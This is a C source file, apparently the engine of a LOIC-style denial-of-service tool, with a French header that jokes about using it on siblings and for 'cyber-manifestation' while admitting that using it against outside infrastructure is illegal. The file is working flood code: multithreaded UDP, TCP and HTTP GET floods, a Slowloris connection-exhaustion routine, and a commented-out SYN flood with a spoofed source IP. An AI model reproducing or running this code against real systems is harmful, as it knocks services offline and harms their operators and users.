/*

 NOTE (fr)
 Pourquoi ce programme ?

 1. Je voulais apprendre le C.
 2. GTK, je connaissais pas, mais on m'en avais dit du bien, alors il m'a fallu essayer aussi.
 3. Tr�s peu de programmes << avanc�s >> poss�dent des interfaces utilisateurs. Le but est de rendre accessible de type de programmes aux newbies.
 A terme, j'aimerais que l'outil int�gre encore davantage de fonctions, toujours dans cet esprit "accessible".


 Utilit� ?

 1. Tests de s�curit� sur votre r�seau.
 2. Faire chier votre petit fr�re / petite soeur.
 3. Faire de la cyber-manifestation (pour le jour o� �a sera l�galis�, ce qui n'est pas le cas en ce jour du 13 Aout 2011)
 (car, oui, l'utilisation de l'outil sur des infrastructures ext�rieures est ill�gale, de m�me que la fonction d'usurpation d'IP)


 [ Si vous ne nous laissez pas r�ver, nous ne vous laisserons pas dormir. ]

 */

#include "canon.h"

pthread_t threads[1024]; // Lazors

pthread_mutex_t ca_mutex = PTHREAD_MUTEX_INITIALIZER;


int stop_canon() {

    if ( getStatus() == FIRING ) {
        setStatus(STOPPING);
        return 0;
    }
    else
        return 2;
}

int start_canon() {

    if ( getStatus() == READY ) {

        if ( strcmp(getTarget(),"") != 0 ) {

            if ( isHostname( getTarget() )) {

                int i;
                for ( i=0; i < getNbThreads(); i++ ) {
                    pthread_create(&threads[i],NULL,(void*)fire,(void*)i);
                }

                /* If one or several threads running */
                if (i > 0)
                    setStatus(FIRING);

                pthread_t thread_timeout;
                pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());


                int total_packets_sent = 0;

                for ( i=0; i < getNbThreads(); i++ ) {
                    int packets_sent = 0;
                    pthread_join(threads[i],(void*)&packets_sent);
                    printf("%d ps\n",packets_sent);
                    total_packets_sent += packets_sent;
                }


                setStatus(READY);
                printf("%d packets sent !\n",total_packets_sent);

                return 0;
            }
            else
                return E_UNKNOWN_HOST;

        }
        else
            return E_NO_HOST;
    }
    else
       return E_BUSY;


    return -1;
}

int oversee_timeout(int time) {

    float passed = 0;

    while ( passed < time ) {
        sleep_millis(50);

        #ifdef GTK_GUI
            refresh_infos();
        #endif


        passed += 0.05;
    }

    if ( getStatus() == FIRING ) {
        setStatus(TIMEOUT);
        printf("TIMEOUT !!!\n\n\n");
    }

    return 0;

}

int fire(int id) {

    switch( getProtocol() ) {
        case UDP:
            return udp_fire(id);
            break;
        case HTTP:
            return http_fire_classic(id);
            break;
        case SLOW_HTTP:
            return slowloris_fire(id);
            break;
        case SYN:
            loic_error("SYN Flood only available in Super Mode ( --super )",CONSOLE);
            break;
        default:
            return tcp_fire(id);
            break;
    }


    return -1;
}





/* CANONS */


int http_fire(int id) {

    int packet_count = 0;
    char sent_data[1024];

    SOCKET s = createSocket(TCP);

    s_connect(s,getTarget(),getPort());

    while( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());

        strcpy(sent_data,"GET / ");
        sprintf(sent_data,"GET / HTTP/1.1\nHost: %s\nReferer: %s\nUser-Agent: Mozilla 5.0\n\n","0.0","http://example.com");
        strcat(sent_data,getUdpMessage());

        if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;
        }
        else
            packet_count++;
        printf("%d --> %d\n",id,packet_count);



        if ( isWaitEnabled() == 1 ) {
            char received_data[1024];
            s_recv(s,received_data,sizeof(received_data));
            printf("%s\n",received_data);
        }

        if ( packet_count % 15 == 0 ) {
            setNbPacketsSent(id, packet_count);
        }

        sleep_millis(delay);
    }

    closesocket(s);

    return packet_count;

}

int http_fire_classic(int id) {

    int packet_count = 0;
    char sent_data[1024];



    while( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());

        SOCKET s = createSocket(TCP);

        s_connect(s,getTarget(),getPort());


        char* accept_enc;
        if (isGzipEnabled())
            accept_enc = "Accept-Encoding: gzip, deflate";
        else
            accept_enc = "";


        sprintf(sent_data,"GET %s HTTP/1.1\nHost: %s\nReferer: %s\nUser-Agent: %s\nAccept: */*%s\n\n",
                            getSubsite(),getTarget(),"http://exame.com","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",accept_enc);
        strcat(sent_data,getUdpMessage());

        if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;
        }
        else
            packet_count++;

        printf("%d --> %d\n",id,packet_count);



        if (isWaitEnabled() == 1) {
            char received_data[1024];
            s_recv(s,received_data,sizeof(received_data));
            printf("%s\n",received_data);

        }
        closesocket(s);

        sleep_millis(delay);
    }

    return packet_count;
}

int udp_fire(int id) {

    SOCKET s = createSocket(UDP);

    struct hostent *hostinfo = NULL;
    SOCKADDR_IN to = { 0 };
    const char* hostname = getTarget();

    int tosize = sizeof to;

    hostinfo = gethostbyname(hostname);
    if ( hostinfo == NULL ) {
        char* buffer = (char*) malloc( sizeof(char) * 256 );
        sprintf(buffer,"Unknown host %s.", hostname);
        loic_error( buffer, MINOR );
        setStatus(STOPPING);
        return -1;
    }

    to.sin_addr = *(IN_ADDR *) hostinfo->h_addr;
    to.sin_port = htons(getPort());
    to.sin_family = AF_INET;

    char buffer[512] = "";
    char sent_data[1024];

    strcat(buffer,getUdpMessage());



    int packet_count = 0;
    while ( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());


        strcpy(sent_data,buffer);

        if (isRandomEnabled())
            strcat(sent_data,random_string());



        if( sendto(s, sent_data, strlen(sent_data), 0, (SOCKADDR*)&to, tosize) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;
        }
        else
            packet_count++;

        int n;


        if ( isWaitEnabled() == TRUE ) {
            char received_data[1024];
            if( (n = recvfrom((SOCKET)s, received_data, sizeof(received_data) - 1, 0, (SOCKADDR*)&to, &tosize)) < 0 ) {
                loic_error("No response from host.", MINOR);
            }
        }

         printf("%d --> %d\n",id,packet_count);

        if ( packet_count % 15 == 0 ) {
            setNbPacketsSent(id, packet_count);
        }


         sleep_millis(delay);

    }

    closesocket(s);


    return packet_count;
}

// Vitesse min : 50 packets par seconde.
// Difference de 10
// Vitesse max : 1000 packets par seconde.

int tcp_fire(int id) {


    int packet_count = 0;

    SOCKET s = createSocket(TCP);

    s_connect(s,getTarget(),getPort());


    char buffer[512] = "";
    char sent_data[1024];

    strcat(buffer,getUdpMessage());



    while( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());

        strcpy(sent_data,buffer);

        if (isRandomEnabled())
            strcat(sent_data,random_string());

        if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;

        }
        else
            packet_count++;

        printf("%d --> %d\n",id,packet_count);


        if (isWaitEnabled() == 1) {
            char received_data[1024];
            s_recv(s,received_data,sizeof(received_data));

            printf("%s\n",received_data);
        }

        if ( packet_count % 15 == 0 ) {
            setNbPacketsSent(id, packet_count);
        }

        sleep_millis(delay);
    }

    closesocket(s);


    return packet_count;
}

int slowloris_fire(int id) {

    char sent_data[1024];

    int socket_counter = 0;
    SOCKET socket_tab[50];


    while( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());

        SOCKET s = createSocket(TCP);

        s_connect(s,getTarget(),getPort());



        char* accept_enc;
        if ( isGzipEnabled() ) {
            accept_enc = "Accept-Encoding: gzip, deflate";
        }
        else {
            accept_enc = "";
        }

        char* req_type;
        if ( useSlowGet() ) {
            req_type = "GET";
        }
        else {
            req_type = "POST";
        }


        sprintf(sent_data,"%s %s HTTP/1.1\nHost: %s\nReferer: %s\nUser-Agent: %s\nAccept: */*%s\n\n",
                            req_type,getSubsite(),getTarget(),"http://exame.com","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",accept_enc);
        strcat(sent_data,getUdpMessage());

        if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;
        }
        else {
            socket_tab[socket_counter] = s;
            socket_counter++;
        }

        printf("%d --> %d\n",id,socket_counter);



        if ( isWaitEnabled() ) {
            char received_data[1024];
            s_recv(s,received_data,sizeof(received_data));
            printf("%s\n",received_data);

        }

        if ( socket_counter % 15 == 0 ) {
            setNbPacketsSent(id, socket_counter);
        }

        sleep_millis(delay);
    }

    int i;
    for (i=0; i<socket_counter; i++) {
        closesocket(socket_tab[i]);
    }

    return socket_counter;

}

int raw_test(int id) {

    int packet_count = 0;
    char sent_data[1024];

    SOCKET s = INVALID_SOCKET;

    s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    s_connect(s,getTarget(),getPort());

    while( getStatus() == FIRING ) {

        int delay = speed2delay(getSpeed());

        strcpy(sent_data,"GET / ");
        sprintf(sent_data,"GET / HTTP/1.1\nHost: %s\nReferer: %s\nUser-Agent: Mozilla 5.0\n\n","0.0","http://example.com");
        strcat(sent_data,getUdpMessage());

        if( send(s, sent_data, strlen(sent_data), 0) < 0 ) {
            loic_error("Unable to connect.", GRAVE);
            setStatus(STOPPING);
            return -1;
        }
        else
            packet_count++;


        printf("%d --> %d\n",id,packet_count);



        if ( isWaitEnabled() == 1 ) {
            char received_data[1024];
            s_recv(s,received_data,sizeof(received_data));
            printf("%s\n",received_data);
        }

        sleep_millis(delay);
    }

    if ( packet_count % 15 == 0 ) {
        setNbPacketsSent(id, packet_count);
    }

    closesocket(s);

    return packet_count;

}

/*
int syn_fire(int id) {
    #ifdef WIN32

        char* dev = (char*) malloc( sizeof(char) * 1024 );
        strcpy(dev,c_get_interface_name_from_index( 1 ));

            c_send_packet(dev);

        loic_error("TCP SYN Flood unavalaible on Windows\n",CONSOLE);

        setStatus(STOPPING);
        return -1;


    #elif defined (linux)


        SOCKET s;
        char packet[4096];
        struct sockaddr_in dest;
        struct iphdr* ip = (struct iphdr*) packet;
        struct tcphdr* tcp = (struct tcphdr*) packet + sizeof(struct iphdr);
        struct hostent* he;

        if ( ( he = gethostbyname(getTarget()) ) == NULL ) {
            printf("Couldn't resolve hostname !\n");
            exit(-1);
        }

        if ( (s = socket (AF_INET, SOCK_RAW, IPPROTO_TCP) ) == -1) {
            printf("Socket failed !\n");
            printf("Must be root to make raw socket.\n");
            exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_port = htons(getPort());
        dest.sin_addr = *((struct in_addr *)he->h_addr);
        memset(packet, 0, 4096); // Zero out packet.

        // Fill in IP headers.
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = htons(1337);
        ip->saddr = inet_addr("127.0.0.1");
        ip->daddr = inet_ntoa(dest.sin_addr);
        ip->ttl = 255;
        ip->protocol = 6;
        ip->check = 0;
        ip->tos = 0;
        ip->frag_off = 0;

        // Fill in TCP headers.
        tcp->source = htons(1337);
        tcp->dest = htons(getPort());
        tcp->seq = htons(random());
        tcp->ack = 0;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->doff = 5;
        tcp->rst = 0;
        tcp->psh = 0;
        tcp->fin = 0;
        tcp->urg = 0;
        tcp->ack_seq = htons(0);

        int packet_count = 0;

        while(getStatus() == FIRING) {

            int delay = speed2delay(getSpeed());


            sendto( s, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(struct sockaddr) );

            packet_count++;
            printf("%d --> %d\n",id,packet_count);

            if ( isWaitEnabled() == 1 ) {
                char received_data[1024];
                s_recv(s,received_data,sizeof(received_data));
                printf("r=%s\n",received_data);
            }

            sleep_millis(delay);
        }




        return packet_count;

#endif


}
*/


